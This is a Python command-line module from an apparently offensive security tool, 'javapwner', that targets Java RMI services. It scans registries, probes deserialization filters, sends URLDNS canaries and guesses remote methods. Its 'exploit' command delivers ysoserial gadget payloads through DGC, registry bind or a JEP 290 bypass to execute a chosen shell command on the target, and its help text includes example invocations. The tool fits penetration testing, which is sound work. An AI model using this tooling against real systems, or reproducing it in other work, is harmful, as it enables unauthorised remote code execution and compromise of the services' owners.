"""Click sub-commands for the Java RMI module.

Commands:
  javapwner rmi scan    -t HOST [-p PORT]     ← Registry enumeration + JEP 290 probe
  javapwner rmi exploit -t HOST -p PORT --gadget NAME --cmd CMD
  javapwner rmi gadgets
"""

from __future__ import annotations

import sys

import click

from javapwner.core.output import OutputFormatter
from javapwner.exceptions import JavaPwnerError, PayloadError
from javapwner.protocols.rmi.scanner import RmiScanner
from javapwner.protocols.rmi.exploiter import RmiExploiter
from javapwner.protocols.rmi.guesser import RmiMethodGuesser

DEFAULT_PORT = 1099


def _get_fmt(ctx: click.Context) -> OutputFormatter:
    return ctx.obj["formatter"]


def _get_timeout(ctx: click.Context) -> float:
    return ctx.obj.get("timeout", 5.0)


def _get_ysoserial(ctx: click.Context) -> str | None:
    return ctx.obj.get("ysoserial_path")


@click.group()
def rmi() -> None:
    """Java RMI / JMX protocol commands."""


# ---------------------------------------------------------------------------
# scan
# ---------------------------------------------------------------------------

@rmi.command("scan")
@click.option("-t", "--target", required=True, metavar="HOST",
              help="Target hostname or IP address.")
@click.option("-p", "--port", default=DEFAULT_PORT, show_default=True, type=int,
              metavar="PORT", help="TCP port of the RMI endpoint.")
@click.option("--urldns", "urldns_canary", default=None, metavar="URL",
              help="Send a URLDNS payload via DGC to detect blind deserialization (check DNS logs).")
@click.pass_context
def scan_cmd(ctx: click.Context, target: str, port: int, urldns_canary: str | None) -> None:
    """Enumerate a Java RMI Registry and probe for JEP 290 filters.

    \b
    Steps performed:
      1. JRMP handshake — confirm the endpoint speaks Java RMI
      2. Registry list() — retrieve all bound names
      3. DGC JEP 290 probe — test deserialization filter state (no ysoserial needed)

    \b
    Examples:
      javapwner rmi scan -t 10.0.0.5
      javapwner rmi scan -t 10.0.0.5 -p 8282
    """
    fmt = _get_fmt(ctx)
    timeout = _get_timeout(ctx)

    scanner = RmiScanner(timeout=timeout)

    with fmt.status(f"Scanning {target}:{port}…"):
        try:
            result = scanner.scan(target, port, urldns_canary=urldns_canary)
        except JavaPwnerError as exc:
            fmt.error(str(exc))
            sys.exit(1)

    if fmt.json_mode:
        fmt.print_json(result.to_dict())
        return

    if not result.is_open:
        fmt.error(f"Port {port} is closed or filtered: {result.error}")
        sys.exit(1)

    if result.is_jrmp:
        fmt.success("JRMP endpoint confirmed")
        if result.jrmp_version:
            fmt.info(f"  Protocol version : {result.jrmp_version}")
        if result.jrmp_host:
            fmt.info(f"  Server hostname  : {result.jrmp_host}")
        if result.jrmp_port:
            fmt.info(f"  Server port      : {result.jrmp_port}")
    else:
        fmt.warning("Port is open but JRMP was not confirmed.")

    fmt.section("RMI Registry")
    if result.is_registry:
        fmt.success(f"Registry confirmed — {len(result.bound_names)} bound name(s)")
        for name in result.bound_names:
            type_str = result.name_types.get(name, "")
            ep = result.stub_endpoints.get(name)
            detail_parts = []
            if type_str:
                detail_parts.append(type_str)
            if ep:
                detail_parts.append(f"{ep.get('host', '?')}:{ep.get('port', '?')}")
            detail = f"  ({', '.join(detail_parts)})" if detail_parts else ""
            fmt.info(f"  {name}{detail}")
    else:
        fmt.info("No Registry response (may be JMX-only or non-registry JRMP).")

    fmt.section("DGC / JEP 290")
    d = result.to_dict()
    jep290_str = d.get("dgc_jep290", "unknown")
    if result.jep290_active is False:
        fmt.success(f"DGC JEP 290 : {jep290_str}")
        fmt.warning(
            "DGC deserialization appears UNFILTERED. "
            "Run 'javapwner rmi exploit' to test RCE."
        )
    elif result.jep290_active is True:
        fmt.warning(f"DGC JEP 290 : {jep290_str}")
    elif result.dgc_reachable:
        fmt.info(f"DGC JEP 290 : {jep290_str}")
    else:
        fmt.info("DGC JEP 290 : unreachable")

    # URLDNS canary
    if result.urldns_sent:
        fmt.section("URLDNS Canary")
        fmt.success(f"URLDNS payload sent — canary: {result.urldns_canary}")
        fmt.info("  Check your DNS server logs for resolution.")


# ---------------------------------------------------------------------------
# exploit
# ---------------------------------------------------------------------------

@rmi.command("exploit")
@click.option("-t", "--target", required=True, metavar="HOST")
@click.option("-p", "--port", default=DEFAULT_PORT, show_default=True, type=int)
@click.option("--gadget", required=True, metavar="NAME",
              help="ysoserial gadget chain name (e.g. CommonsCollections6).")
@click.option("--cmd", "command", required=True, metavar="CMD",
              help="Shell command to execute on the target.")
@click.option("--via", type=click.Choice(["dgc", "registry", "jep290-bypass"]),
              default="dgc", show_default=True,
              help="Delivery vector: 'dgc' (always available), 'registry', or 'jep290-bypass' (JRMP listener).")
@click.pass_context
def exploit_cmd(
    ctx: click.Context,
    target: str,
    port: int,
    gadget: str,
    command: str,
    via: str,
) -> None:
    """Deliver a ysoserial payload to a Java RMI endpoint.

    \b
    Delivery vectors:
      --via dgc       DGC dirty() call — works on any JRMP endpoint (default)
      --via registry  Registry bind() — requires unauthenticated bind access

    \b
    Examples:
      javapwner rmi exploit -t 10.0.0.5 -p 1099 --gadget CommonsCollections6 --cmd 'id'
      javapwner rmi exploit -t 10.0.0.5 -p 8282 --gadget Spring1 --cmd 'id' --via dgc
    """
    fmt = _get_fmt(ctx)
    timeout = _get_timeout(ctx)
    jar = _get_ysoserial(ctx)

    try:
        exploiter = RmiExploiter(timeout=timeout, jar_path=jar)
    except PayloadError as exc:
        fmt.error(str(exc))
        sys.exit(1)

    fmt.info(f"Exploiting {target}:{port} via {via} with gadget '{gadget}' → {command!r}")

    try:
        result = exploiter.exploit(target, port, gadget, command, via=via)
    except JavaPwnerError as exc:
        fmt.error(str(exc))
        sys.exit(1)

    if fmt.json_mode:
        fmt.print_json(result.to_dict())
        return

    if result.error:
        fmt.error(f"Exploit failed: {result.error}")
        sys.exit(1)

    if result.likely_success:
        fmt.success("Payload delivered — no exception in response (likely executed).")
    elif result.exception_in_response:
        fmt.warning("TC_EXCEPTION in response — payload may have been filtered (JEP 290?).")
    elif result.sent:
        fmt.info("Payload sent — no response received (blind execution).")
    else:
        fmt.error("Payload was not sent.")

    if fmt.verbose:
        fmt.print_hex_dump(result.response_bytes, label="Server response")


# ---------------------------------------------------------------------------
# gadgets
# ---------------------------------------------------------------------------

@rmi.command("gadgets")
@click.pass_context
def gadgets_cmd(ctx: click.Context) -> None:
    """List available ysoserial gadget chains."""
    fmt = _get_fmt(ctx)
    jar = _get_ysoserial(ctx)

    try:
        from javapwner.core.payload import YsoserialWrapper
        wrapper = YsoserialWrapper(jar_path=jar)
        gadgets = wrapper.list_gadgets()
    except PayloadError as exc:
        fmt.error(str(exc))
        sys.exit(1)

    if fmt.json_mode:
        fmt.print_json({"gadgets": gadgets})
        return

    if not gadgets:
        fmt.warning("No gadgets found — check ysoserial.jar version.")
        return

    fmt.success(f"Available gadgets ({len(gadgets)}):")
    for g in gadgets:
        fmt.info(f"  {g}")


# ---------------------------------------------------------------------------
# guess
# ---------------------------------------------------------------------------

@rmi.command("guess")
@click.option("-t", "--target", required=True, metavar="HOST",
              help="Target hostname or IP address.")
@click.option("-p", "--port", default=DEFAULT_PORT, show_default=True, type=int,
              metavar="PORT", help="TCP port of the RMI endpoint.")
@click.option("--name", "bound_name", required=True, metavar="NAME",
              help="Bound name to probe for known methods.")
@click.option("--wordlist", "wordlist_path", default=None, metavar="FILE",
              help="JSON file mapping method names to method hashes.  "
                   "Format: {\"method_name\": hash_int, ...} or "
                   "{\"interface\": {\"method\": hash, ...}, ...}.  "
                   "Defaults to the built-in resources/rmi_methods.json.")
@click.pass_context
def guess_cmd(
    ctx: click.Context, target: str, port: int, bound_name: str, wordlist_path: str | None
) -> None:
    """Probe an RMI-bound object for known method signatures.

    Sends CALL messages with well-known method hashes and detects
    UnmarshalException responses (method exists, wrong args).

    \b
    Examples:
      javapwner rmi guess -t 10.0.0.5 --name myService
      javapwner rmi guess -t 10.0.0.5 --name myService --wordlist custom.json
    """
    import json

    fmt = _get_fmt(ctx)
    timeout = _get_timeout(ctx)

    wordlist: dict[str, int] | None = None
    if wordlist_path:
        try:
            with open(wordlist_path) as f:
                raw = json.load(f)
            # Support both flat {method: hash} and nested {interface: {method: hash}}
            flat: dict[str, int] = {}
            for k, v in raw.items():
                if isinstance(v, dict):
                    flat.update(v)
                elif isinstance(v, int):
                    flat[k] = v
            wordlist = flat
        except (OSError, ValueError) as exc:
            fmt.error(f"Failed to load wordlist: {exc}")
            sys.exit(1)

    guesser = RmiMethodGuesser(timeout=timeout)

    with fmt.status(f"Guessing methods on {target}:{port}/{bound_name}…"):
        try:
            result = guesser.guess(target, port, bound_name, wordlist=wordlist)
        except JavaPwnerError as exc:
            fmt.error(str(exc))
            sys.exit(1)

    if fmt.json_mode:
        fmt.print_json(result.to_dict())
        return

    if result.class_name:
        fmt.info(f"  Class: {result.class_name}")

    if result.confirmed_methods:
        fmt.success(f"Confirmed methods ({len(result.confirmed_methods)}):")
        for m in result.confirmed_methods:
            fmt.info(f"  [+] {m}")
    else:
        fmt.info("No known methods confirmed.")

    if result.error:
        fmt.warning(f"Partial error: {result.error}")


# ---------------------------------------------------------------------------
# info
# ---------------------------------------------------------------------------

@rmi.command("info")
@click.option("-t", "--target", required=True, metavar="HOST",
              help="Target hostname or IP address.")
@click.option("-p", "--port", default=DEFAULT_PORT, show_default=True, type=int,
              metavar="PORT", help="TCP port of the RMI endpoint.")
@click.pass_context
def info_cmd(ctx: click.Context, target: str, port: int) -> None:
    """Show detailed information about an RMI endpoint (full scan + lookup).

    \b
    Examples:
      javapwner rmi info -t 10.0.0.5
    """
    fmt = _get_fmt(ctx)
    timeout = _get_timeout(ctx)
    scanner = RmiScanner(timeout=timeout)

    with fmt.status(f"Gathering info on {target}:{port}…"):
        try:
            result = scanner.scan(target, port)
        except JavaPwnerError as exc:
            fmt.error(str(exc))
            sys.exit(1)

    if fmt.json_mode:
        fmt.print_json(result.to_dict())
        return

    if not result.is_open:
        fmt.error(f"Port {port} is closed or filtered: {result.error}")
        sys.exit(1)

    fmt.section("RMI Endpoint Info")
    fmt.info(f"  Host    : {result.jrmp_host or target}")
    fmt.info(f"  Port    : {result.jrmp_port or port}")
    fmt.info(f"  JRMP    : {'yes' if result.is_jrmp else 'no'}")
    fmt.info(f"  Registry: {'yes' if result.is_registry else 'no'}")

    if result.bound_names:
        fmt.section("Bound Names (with type info)")
        for name in result.bound_names:
            cls = result.name_types.get(name, "unknown")
            ep = result.stub_endpoints.get(name)
            ep_str = f" -> {ep['host']}:{ep['port']}" if ep else ""
            fmt.info(f"  {name} : {cls}{ep_str}")

    d = result.to_dict()
    jep290_str = d.get("dgc_jep290", "unknown")
    fmt.section("Security")
    fmt.info(f"  DGC JEP 290: {jep290_str}")
